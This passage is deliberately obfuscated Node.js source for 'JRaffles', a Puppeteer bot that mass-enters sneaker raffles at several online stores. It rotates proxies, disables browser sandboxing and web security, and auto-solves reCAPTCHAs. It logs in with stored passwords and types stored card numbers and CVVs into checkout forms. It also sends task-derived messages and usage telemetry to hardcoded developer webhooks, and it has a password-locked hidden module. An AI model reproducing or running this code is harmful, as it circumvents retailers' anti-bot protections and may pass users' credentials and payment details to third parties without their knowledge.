                                '--proxy-server=' + _0x3f230a[0x0] + ':' + _0x3f230a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x44bafc = await _0x1e23f8['newPage']();
                            await _0x44bafc['authenticate']({
                                'username': '' + _0x3f230a[0x2],
                                'password': '' + _0x3f230a[0x3]
                            }), await _0x44bafc['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44bafc['setRequestInterception'](!![]), _0x44bafc['on']('request', _0x449657 => {
                                _0x449657['resourceType']() === 'image' || _0x449657['resourceType']() === 'font' || _0x449657['resourceType']() === 'media' ? _0x449657['abort']() : _0x449657['continue']();
                            }), await _0x44bafc['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x44bafc['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x44bafc['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x506d6f(0x258), await _0x44bafc['waitForSelector']('#CustomerEmail'), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x44bafc['type']('#CustomerEmail', '' + _0x5de50b[_0x1c14c6]['Email']), await _0x506d6f(0x12c), await _0x44bafc['type']('#CustomerPassword', '' + _0x5de50b[_0x1c14c6]['Password']), await _0x506d6f(0x226), await _0x44bafc['$eval']('#customer_login', _0x1445f7 => _0x1445f7['submit']()), await _0x506d6f(0x7d0), await _0x44bafc['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20' + _0x195a86['cyan']('Solving\x20Captcha')), await _0x44bafc['solveRecaptchas'](), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x44bafc['$eval']('.shopify-challenge__container\x20>\x20form', _0x3e1044 => _0x3e1044['submit']());
                            try {
                                await _0x44bafc['waitForSelector']('.nav-account'), await _0x506d6f(0x4b0);
                            } catch {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x44bafc['goto']('' + _0x5de50b[_0x1c14c6]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x506d6f(0xbb8), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x44bafc['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x44bafc['click']('.product-select-variant-wrapper'), await _0x506d6f(0x320), await _0x44bafc['click']('li.product-select-variant__value[data-size=\x22' + _0x5de50b[_0x1c14c6]['Size'] + '\x22]'), await _0x506d6f(0x384), await _0x44bafc['$eval']('#AddToCartForm-product-template-raffle', _0x806d2e => _0x806d2e['submit']()), await _0x44bafc['waitForSelector']('.cart-order-summary__content'), await _0x506d6f(0x514), await _0x44bafc['goto']('https://drop.slamjam.com/checkout'), await _0x506d6f(0x514), await _0x44bafc['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x44bafc['select']('#checkout_shipping_address_country', '' + _0x5de50b[_0x1c14c6]['Country']), await _0x506d6f(0x200), await _0x44bafc['waitForSelector']('#checkout_shipping_address_first_name'), await _0x44bafc['type']('#checkout_shipping_address_first_name', '' + _0x5de50b[_0x1c14c6]['FirstName']), await _0x506d6f(0x237), await _0x44bafc['type']('#checkout_shipping_address_last_name', '' + _0x5de50b[_0x1c14c6]['LastName']), await _0x506d6f(0x1e0), await _0x44bafc['type']('#checkout_shipping_address_address1', _0x5de50b[_0x1c14c6]['Address1'] + '\x20' + _0x5de50b[_0x1c14c6]['HouseNumber']), await _0x506d6f(0x514), await _0x44bafc['type']('#checkout_shipping_address_address2', '' + _0x5de50b[_0x1c14c6]['Address2']), await _0x506d6f(0x514);
                            _0x5de50b[_0x1c14c6]['Postcode'] == undefined && (_0x5de50b[_0x1c14c6]['Postcode'] = _0x5de50b[_0x1c14c6]['Zip']);
                            await _0x44bafc['type']('#checkout_shipping_address_zip', '' + _0x5de50b[_0x1c14c6]['Postcode']), await _0x506d6f(0x2bc), await _0x44bafc['type']('#checkout_shipping_address_city', '' + _0x5de50b[_0x1c14c6]['City']), await _0x506d6f(0x320), await _0x44bafc['type']('#checkout_shipping_address_phone', '' + _0x5de50b[_0x1c14c6]['Phone']), await _0x506d6f(0x320), await _0x44bafc['click']('#continue_button'), await _0x506d6f(0xbb8), await _0x44bafc['waitForSelector']('.summary-title'), await _0x506d6f(0x320), await _0x44bafc['click']('#continue_button'), await _0x506d6f(0x320), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x44bafc['waitForSelector']('#checkout_credit_card_vault'), await _0x506d6f(0x3e8);
                            var _0x6da953 = await _0x44bafc['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x25b194 = await _0x6da953['contentFrame']();
                            await _0x25b194['click']('#number'), await _0x506d6f(0x3e8), await _0x25b194['type']('#number', '' + _0x5de50b[_0x1c14c6]['CardNumber'], { 'delay': 0x78 }), _0x6da953 = await _0x44bafc['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x25b194 = await _0x6da953['contentFrame'](), await _0x506d6f(0x1c2), await _0x25b194['click']('#name'), await _0x506d6f(0x1f4), await _0x25b194['type']('#name', '' + _0x5de50b[_0x1c14c6]['NameOnCard'], { 'delay': 0x78 }), _0x6da953 = await _0x44bafc['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x25b194 = await _0x6da953['contentFrame'](), await _0x506d6f(0x1c2), await _0x25b194['click']('#expiry'), await _0x506d6f(0x1f4), await _0x25b194['type']('#expiry', '' + _0x5de50b[_0x1c14c6]['ExpiryDate'], { 'delay': 0x78 }), _0x6da953 = await _0x44bafc['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x25b194 = await _0x6da953['contentFrame'](), await _0x506d6f(0x1c2), await _0x25b194['click']('#verification_value'), await _0x506d6f(0x1f4), await _0x25b194['type']('#verification_value', '' + _0x5de50b[_0x1c14c6]['CVV'], { 'delay': 0x78 }), await _0x44bafc['$eval']('#accepts-flag-raffle', _0x28d15a => _0x28d15a['click']()), await _0x506d6f(0x7d0), console['log'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x44bafc['$eval']('#continue_button', _0x31ef60 => _0x31ef60['click']()), await _0x506d6f(0x1b58), await _0x44bafc['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x44bafc['$eval']('.edit_checkout.animate-floating-labels', _0x499b4e => _0x499b4e['submit']()), await _0x506d6f(0x7d0);
                            try {
                                await _0x44bafc['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x267519 = 'no', _0x37d376(_0x5de50b[_0x1c14c6], _0x584079), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x355a1b) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x355a1b['message']);
                            }
                            var _0x3e71b4 = await _0x52a86e(_0x5de50b[_0x1c14c6], _0x584079, 'dev', ![]), _0x37db01 = await _0x52a86e(_0x5de50b[_0x1c14c6], _0x584079, 'pub', ![]);
                            const _0x51fd5f = {
                                'succesDEVMSG': { 'embeds': [_0x3e71b4] },
                                'succesPUBMSG': { 'embeds': [_0x37db01] }
                            };
                            try {
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x51fd5f['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x51fd5f['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x3f4ede, _0x51fd5f['succesPUBMSG']);
                            } catch (_0x329f05) {
                                console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x329f05));
                            }
                        } catch (_0xc81f4c) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0xd1bb45[taskModule]['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20' + _0xc81f4c)), _0x1b823e = '' + _0xc81f4c;
                            var _0x4b64c1 = await _0x52a86e(kickz[_0x1c14c6], _0x584079, 'dev', !![], _0x1b823e);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x4b64c1] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], EMBEDS['errorDEV']), await _0x57bb0c(_0xb4796a, EMBEDS['errorDEV']), _0x267519 = 'yes';
                        } finally {
                            _0x1e23f8 && _0x1e23f8['close']();
                            if (_0x267519 == 'yes' && _0x500def != 0x5 && _0x1b823e != 'Size\x20Not\x20Found') {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x584079['name'] + ']\x20Task\x20' + (_0x1c14c6 + 0x1) + '\x20:\x20Retrying')), _0x1c14c6 = _0x1c14c6 - 0x1, _0x500def = _0x500def + 0x1;
                                continue;
                            }
                            _0x267519 == 'yes' && _0x500def >= 0x5 && (_0x5c9ba1(_0x5de50b[_0x1c14c6], _0x584079), _0x267519 = 'no', _0x500def = 0x0), console['log']('Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x1f4e67) {
                    var _0x48ae8c = await _0x46afed(), _0x20e5e4 = _0x5b0582['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3bd887 = _0x2f49f0['parse'](_0x20e5e4, { 'header': !![] })['data'];
                    for (var _0x4c571c = 0x0; _0x4c571c < _0x3bd887['length']; _0x4c571c++) {
                        var _0xf2a542 = _0x3bd887[_0x4c571c]['Store'], _0x521630 = _0x3bd887[_0x4c571c]['Mode'];
                        for (var _0x33600f of _0xd1bb45) {
                            const _0x5276d7 = _0x33600f['name']['includes'](_0xf2a542);
                            if (!_0x5276d7)
                                continue;
                            for (mode of _0x33600f['modules']) {
                                if (mode['name'] == _0x521630) {
                                    console['log']('Running\x20' + _0x195a86['cyan'](mode['name'])), await mode['function'](mode, [_0x3bd887[_0x4c571c]], _0x48ae8c);
                                    var _0x2fa65e = _0x20e5e4['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x5b0582['writeFileSync']('../failed-tasks.csv', _0x2fa65e);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2ba161 = await _0x3264a0['get']('Answer');
                    if (_0x2ba161['Answer']['toLowerCase']() == 'y') {
                        _0x5b0582['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x506d6f(0x3e8);
                        return;
                    }
                    if (_0x2ba161['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x506d6f(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x506d6f(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1e60a2(_0x229dae) {
    var _0xc0bc32 = await _0x46afed(), _0x265af2 = _0x5b0582['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x42b002 = _0x2f49f0['parse'](_0x265af2, { 'header': !![] })['data'];
    for (var _0x4de34a = 0x0; _0x4de34a < _0x42b002['length']; _0x4de34a++) {
        var _0x24fba7 = _0x42b002[_0x4de34a]['Store'], _0x59922c = _0x42b002[_0x4de34a]['Mode'];
        for (var _0x3e0790 of _0xd1bb45) {
            const _0x43cadb = _0x3e0790['name']['includes'](_0x24fba7);
            if (_0x43cadb)
                for (mode of _0xd1bb45[_0x3e0790]['modules']) {
                    const _0x64079b = mode['name']['includes'](_0x59922c);
                    _0x64079b && (_0x229dae = mode['name'], await mode['function'](_0x229dae, _0x42b002[_0x4de34a], _0xc0bc32));
                }
        }
    }
}
async function _0x5655e2() {
    await _0x115465(), console['clear']();
    if (_0xca8e52 != 'devkey') {
        let _0x2e1753 = await _0x36aa4d['autoUpdate']();
        if (_0x2e1753 === 'yes')
            return _0x460daf('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x5bd85a == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x506d6f(0x2710);
        ;
    }
    await _0x3b4c02(_0x5bd85a);
    if (_0x355e77 === ![])
        return console['log']('Closing\x20Browser'), await _0x506d6f(0xbb8);
    else
        try {
            var _0x4e6534 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3ab3dd
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0xca8e52
                    }
                ]
            }];
            const _0x678ba2 = { 'embeds': _0x4e6534 };
            var _0x26e151 = await _0x52a86e(null, null, 'open', ![]);
            const _0x1ed533 = { 'openDEVMSG': { 'embeds': [_0x26e151] } };
            await _0x57bb0c(_0x14158e, _0x1ed533['openDEVMSG']);
            async function _0x2d0e20() {
                _0x3d4687('JRaffles\x20' + _0xca8e52), console['clear'](), console['log']('Welcome\x20to\x20' + _0x195a86['cyan']('JRaffles();') + '\x20' + _0xca8e52), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x19026c = 0x0; _0x19026c < _0xd1bb45['length'] - 0x4; _0x19026c++) {
                    if (_0x19026c >= 0xa) {
                        console['log']('\x20(' + _0x19026c + ')\x20[' + _0xd1bb45[_0x19026c]['name'] + ']');
                        continue;
                    }
                    if (_0xd1bb45[_0x19026c]['name'] === 'Reload\x20Settings' || _0xd1bb45[_0x19026c]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x19026c + ')\x20\x20[' + _0xd1bb45[_0x19026c]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0xd1bb45['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0xd1bb45['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0xd1bb45['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0xd1bb45['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2c3ef7();
                if (taskModule > _0xd1bb45['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x506d6f(0x3e8), _0x2d0e20();
                if (_0xd1bb45[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                    var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x9a60b8 = await _0x46afed(), _0x58c454 = await _0x49529d();
                        await _0x4b9018['function'](_0x4b9018, _0x58c454, _0x9a60b8);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x9a60b8 = await _0x46afed(), _0x58c454 = await _0x49529d();
                            await _0x4b9018['function'](_0x4b9018, _0x58c454, _0x9a60b8);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x9a60b8 = await _0x46afed();
                                await _0x4b9018['function'](_0x4b9018, _0x5be957, _0x9a60b8);
                            }
                        }
                    }
                    return _0x2d0e20();
                }
                if (_0xd1bb45[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                        var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x9a60b8 = await _0x46afed(), _0x16383a = await _0x49529d();
                            await _0x4b9018['function'](_0x4b9018, _0x16383a, _0x9a60b8);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x9a60b8 = await _0x46afed(), _0x16383a = await _0x49529d();
                                await _0x4b9018['function'](_0x4b9018, _0x16383a, _0x9a60b8);
                            }
                        }
                    } catch (_0x4fc62a) {
                        console['log'](_0x4fc62a), await _0x506d6f(0xfa0);
                    }
                    return _0x2d0e20();
                }
                if (_0xd1bb45[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                    var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x9a60b8 = await _0x46afed();
                        return await _0x4b9018['function'](_0x4b9018, _0x9a60b8), _0x2d0e20();
                    }
                    var _0x9a60b8 = await _0x46afed(), _0xd74d90 = await _0x49529d();
                    return await _0x4b9018['function'](_0x4b9018, _0xd74d90, _0x9a60b8), _0x2d0e20();
                }
                if (_0xd1bb45[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                    var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x9a60b8 = await _0x46afed(), _0xd74d90 = await _0x49529d();
                    return await _0x4b9018['function'](_0x4b9018, _0xd74d90, _0x9a60b8), _0x2d0e20();
                } else {
                    if (_0xd1bb45[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                        var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x9a60b8 = await _0x46afed(), _0xbc8adf = await _0x49529d();
                            return await _0x4b9018['function'](_0x4b9018, _0xbc8adf, _0x9a60b8), _0x2d0e20();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x9a60b8 = await _0x46afed();
                                return await _0x4b9018['function'](_0x4b9018, _0x5be957, _0x9a60b8), _0x2d0e20();
                            }
                        }
                        ;
                    } else {
                        if (_0xd1bb45[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                            var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction], _0x9a60b8 = await _0x46afed(), _0x5d16a8 = await _0x49529d();
                            return await _0x4b9018['function'](_0x4b9018, _0x5d16a8, _0x9a60b8), await _0x506d6f(0x1388), _0x2d0e20();
                        } else {
                            if (_0xd1bb45[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x9a60b8 = await _0x46afed(), _0xbc8adf = await _0x49529d();
                                    return await _0x4b9018['function'](_0x4b9018, _0xbc8adf, _0x9a60b8), _0x2d0e20();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x9a60b8 = await _0x46afed();
                                        return await _0x4b9018['function'](_0x4b9018, _0x5be957, _0x9a60b8), _0x2d0e20();
                                    }
                                }
                                ;
                            } else {
                                if (_0xd1bb45[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                    var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x5085f3('https://bouncewear.com/nl/account/register', _0x4b9018);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0xd1bb45[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                        var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x9a60b8 = await _0x46afed(), _0x4227be = await _0x49529d();
                                            return await _0x4b9018['function']('', _0x4b9018, _0x4227be, _0x9a60b8), _0x2d0e20();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x9a60b8 = await _0x46afed(), _0x4227be = await _0x49529d();
                                                return await _0x4b9018['function'](_0x4b9018, _0x4227be, _0x9a60b8), _0x2d0e20();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0xd1bb45[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                            var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x9a60b8 = await _0x46afed(), _0x1cf0da = await _0x49529d();
                                                return await _0x4b9018['function'](_0x4b9018, _0x1cf0da, _0x9a60b8), _0x2d0e20();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x9a60b8 = await _0x46afed(), _0x1cf0da = await _0x49529d();
                                                    return await _0x4b9018['function'](_0x4b9018, _0x1cf0da, _0x9a60b8), _0x2d0e20();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0xd1bb45[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                                var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x9a60b8 = await _0x46afed(), _0x1069ae = await _0x49529d();
                                                    return await _0x4b9018['function']('https://www.kickz.com/nl/login/', _0x4b9018, _0x1069ae, _0x9a60b8), _0x2d0e20();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x9a60b8 = await _0x46afed(), _0x1069ae = await _0x49529d();
                                                        return await _0x4b9018['function'](_0x4b9018, _0x1069ae, _0x9a60b8), _0x2d0e20();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0xd1bb45[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                                    var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x9a60b8 = await _0x46afed(), _0x248a30 = await _0x49529d();
                                                        return await _0x4b9018['function'](_0x4b9018, _0x248a30, _0x9a60b8), _0x2d0e20();
                                                    }
                                                } else {
                                                    if (_0xd1bb45[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x506d6f(0x3e8), _0x2d0e20();
                                                    else {
                                                        if (_0xd1bb45[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x34d454 = _0xd1bb45[taskModule]['name'], _0x9a60b8 = await _0x46afed();
                                                            const _0x20990a = await _0x2ada5d();
                                                            var _0x5be957 = _0x20990a['split'](';');
                                                            await _0x55bf29(_0x5be957, _0x34d454, _0x9a60b8);
                                                        } else {
                                                            if (_0xd1bb45[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x6575b1(_0xd1bb45[taskModule]['modules']);
                                                                var _0x4b9018 = _0xd1bb45[taskModule]['modules'][taskFunction];
                                                                return await _0x4b9018['function'](_0x4b9018), _0x2d0e20();
                                                            } else {
                                                                if (_0xd1bb45[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x299d33 = 0x0;
                                                                    for (const _0x336d4b in _0x5f2d88) {
                                                                        console['log']('(' + _0x299d33 + ')\x20' + _0x336d4b + '\x20:\x20' + _0x5f2d88[_0x336d4b]), _0x299d33++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x299d33 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x1c8b4b = await _0x5a1f0c();
                                                                    if (_0x1c8b4b == _0x299d33)
                                                                        return _0x2d0e20();
                                                                    console['clear'];
                                                                    var _0x312214 = 0x0;
                                                                    for (var _0x5a02ab in _0x5f2d88) {
                                                                        if (_0x1c8b4b == _0x312214) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x5a02ab + '\x20:'), _0x5f2d88[_0x5a02ab] = await _0x145a76(), _0x5b0582['writeFileSync']('../settings.json', JSON['stringify'](_0x5f2d88));
                                                                            break;
                                                                        } else
                                                                            _0x312214++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x506d6f(0xbb8), _0x2d0e20();
                                                                } else {
                                                                    if (_0xd1bb45[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x115465(), _0x2d0e20();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0xd1bb45[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x26d220 = await _0x2f4a2c();
                                                                            _0x26d220 == 'ModuleVoorDeBoys' ? (await _0xe71a0e(), await _0x429043(), await afewFunction(_0x2ae7b4[_0x3ed652], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x506d6f(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x2d0e20();
        } catch (_0x458388) {
            return console['log'](_0x458388), await _0x506d6f(0x3a98);
        }
}
;
_0x3d4687('JRaffles\x20' + _0xca8e52), _0x115465();
try {
    _0x5655e2();
} catch (_0x7d5014) {
    var _0xf91ae = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3ab3dd
            },
            {
                'name': 'Version',
                'value': '' + _0xca8e52
            },
            {
                'name': 'Error',
                'value': '' + _0x7d5014
            }
        ]
    }];
    const _0x39efa6 = { 'embeds': _0xf91ae };
    _0x57bb0c(_0xb4796a, _0x39efa6);
}